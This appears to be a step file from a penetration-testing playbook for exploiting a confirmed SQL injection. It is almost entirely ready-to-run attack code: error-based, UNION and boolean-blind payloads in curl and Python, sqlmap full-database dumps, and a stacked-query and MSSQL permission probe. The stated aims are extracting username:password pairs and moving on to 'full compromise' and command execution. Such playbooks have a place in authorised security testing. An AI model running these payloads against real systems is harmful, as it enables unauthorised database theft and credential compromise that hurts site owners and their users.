# SQL Injection — Verify

## Purpose
Extract database names, table schemas, column structures, and sensitive data rows via the confirmed injection technique. Convert "SQLi detected" into demonstrated data compromise.

## Required Variables
- `$TARGET_URL` — vulnerable endpoint
- `$DB_TYPE` — fingerprinted database (mysql|postgres|mssql|oracle|sqlite)
- `$TECHNIQUE` — confirmed technique (error|boolean|time|union)
- `$OUTDIR` — output root

## Commands

### V1 — Error-Based Data Extraction (MySQL/MariaDB)

```bash
# Database name
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -\"))")
curl -s "$TARGET_URL${ENC}" > "$OUTDIR/sqli/extract_dbname.txt"

# Table enumeration
for i in 0 1 2 3 4 5 6 7 8 9; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT $i,1)))-- -\"))")
  curl -s "$TARGET_URL${ENC}" | grep -oP 'XPATH.*?~([^~\x27]+)' >> "$OUTDIR/sqli/tables_extracted.txt"
done

# Column enumeration for a target table
TBL="users"
for i in 0 1 2 3 4 5 6 7 8 9; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='$TBL' LIMIT $i,1)))-- -\"))")
  curl -s "$TARGET_URL${ENC}" | grep -oP '~([^~\x27]+)' >> "$OUTDIR/sqli/columns_${TBL}.txt"
done

# Data extraction (SUBSTRING for >32 char XPATH limit)
for i in 0 1 2 3 4; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT CONCAT(username,':',password) FROM $TBL LIMIT 0,1),$((i*31+1)),31)))-- -\"))")
  curl -s "$TARGET_URL${ENC}" | grep -oP '~([^~\x27]+)' >> "$OUTDIR/sqli/data_extracted.txt"
done
```

### V2 — UNION-Based Data Extraction

```bash
COLS=3  # confirmed column count from probe phase

# MySQL UNION extraction
MYSQL_UNION="' UNION SELECT CONCAT(username,0x3a,password),NULL,NULL FROM users-- -"
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${MYSQL_UNION}'))")
curl -s "$TARGET_URL${ENC}" > "$OUTDIR/sqli/union_data.txt"

# PostgreSQL UNION
PG_UNION="' UNION SELECT string_agg(username||':'||password,','),NULL,NULL FROM users--"
PG_UNION_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PG_UNION}'))")
curl -s "$TARGET_URL${PG_UNION_ENC}" > "$OUTDIR/sqli/union_pg_data.txt"

# MSSQL UNION
MSSQL_UNION="' UNION SELECT username+':'+password,NULL,NULL FROM users--"
MSSQL_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${MSSQL_UNION}'))")
curl -s "$TARGET_URL${MSSQL_ENC}" > "$OUTDIR/sqli/union_mssql_data.txt"
```

### V3 — Boolean Blind Extraction (Python)

```bash
python3 - "$TARGET_URL" "$DB_TYPE" << 'PYEOF' > "$OUTDIR/sqli/blind_extracted.txt"
import sys, urllib.request, ssl

url = sys.argv[1]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def check(query):
    enc = urllib.parse.quote(query)
    req = urllib.request.Request(url + enc, headers={'User-Agent': 'SQLi-Blind/1.0'})
    try:
        resp = urllib.request.urlopen(req, context=ctx, timeout=10)
        return len(resp.read()) > 100
    except:
        return False

# Extract database name length
db_len = 0
for l in range(1, 50):
    if check("' AND LENGTH(database())=" + str(l) + "-- -"):
        db_len = l
        break

print(f"Database name length: {db_len}")

# Extract database name character by character
db_name = ""
for pos in range(1, db_len + 1):
    for ch in range(32, 127):
        if check(f"' AND ASCII(SUBSTRING(database(),{pos},1))={ch}-- -"):
            db_name += chr(ch)
            print(f"  pos={pos} -> {chr(ch)}  ({db_name})")
            break
    else:
        break

print(f"\n[EXTRACTED] Database: {db_name}")
PYEOF
```

### V4 — sqlmap Full Automation

```bash
# Full database dump via sqlmap
sqlmap -u "$TARGET_URL" --batch --dbs -o "$OUTDIR/sqli/sqlmap_dbs/" 2>&1 | tee "$OUTDIR/sqli/sqlmap_dbs_output.txt"

# If database names are known, enumerate tables
sqlmap -u "$TARGET_URL" --batch -D targetdb --tables -o "$OUTDIR/sqli/sqlmap_tables/" 2>&1 | tee "$OUTDIR/sqli/sqlmap_tables_output.txt"

# Dump columns from target table
sqlmap -u "$TARGET_URL" --batch -D targetdb -T users --columns -o "$OUTDIR/sqli/sqlmap_columns/" 2>&1 | tee "$OUTDIR/sqli/sqlmap_columns_output.txt"

# Full data dump
sqlmap -u "$TARGET_URL" --batch -D targetdb -T users --dump --threads=5 -o "$OUTDIR/sqli/sqlmap_dump/" 2>&1 | tee "$OUTDIR/sqli/sqlmap_dump_output.txt"
```

### V5 — Stacked Query Verification

```bash
# Test if stacked queries work (execute second SELECT after first)
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"'; SELECT 1; SELECT 2;-- -\"))")
curl -s "$TARGET_URL${ENC}" -o /dev/null -w "HTTP %{http_code}\n"

# MSSQL xp_cmdshell check (if stacked works)
MSSQL_CMDSHELL=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"'; IF (SELECT COUNT(*) FROM fn_my_permissions(NULL,'SERVER') WHERE permission_name='CONTROL SERVER')>0 WAITFOR DELAY '00:00:05'--\"))")
curl -s -o /dev/null -w '%{time_total}' "$TARGET_URL${MSSQL_CMDSHELL}"
```

## Detection Signals
- `extract_dbname.txt` contains database name → error-based extraction working
- `data_extracted.txt` shows `username:password` pairs → full data compromise
- `union_data.txt` > 100 bytes and contains non-trivial data → UNION extraction confirmed
- Python blind extractor outputs database name → boolean blind confirmed exploitable
- sqlmap `--dump` completes without errors → automated data extraction achieved

## False Positives
- extractvalue/updatexml returns partial data (32-char XPATH limit) — use SUBSTRING for full values
- UNION data shows NULL in every column — correct column data types are not being extracted; test each column individually
- sqlmap false positive when target returns same response for true/false — cross-validate with manual tests

## Next
├── If data extracted (tables/columns/rows) → go to `04-impact-escalation.md` for full compromise
├── If stacked queries work → go to `04-impact-escalation.md` for command execution
├── If only DB name extracted → escalate with further enumeration; attempt user/hash extraction
└── Always → save extraction output files as evidence